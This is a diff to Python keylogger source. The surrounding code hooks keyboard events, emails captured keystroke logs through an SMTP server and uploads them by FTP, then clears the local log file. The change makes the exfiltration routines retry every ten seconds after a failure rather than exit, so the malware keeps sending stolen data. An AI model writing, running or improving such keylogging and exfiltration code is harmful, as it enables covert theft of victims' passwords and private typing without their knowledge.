@@ -118,7 +118,8 @@ def OnKeyboardEvent(event):
             SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
             SmtpServer.close()
         except:
-            os._exit(1)  # if for some reason, the email cannot send, exit program including threads.
+            time.sleep(10)  # if the email cannot be sent, try again every 10 seconds
+            SendMessages(strLogs, strEmailAc, strEmailPass, blnStop, strExIP)
 
     def SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop):
         global blnFirstSend
@@ -146,7 +147,8 @@ def OnKeyboardEvent(event):
             objLogFile.close(); ftp.close()
             objLogFile = open(TMP + "/log.txt", 'w'); objLogFile.close()  # delete log file contents
         except:
-            os._exit(1)
+            time.sleep(10)  # if messages cannot be sent, try again every 10 seconds
+            SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop)
 
     def StoreMessagesLocal(strLogs, blnStop):
         global blnFirstSend
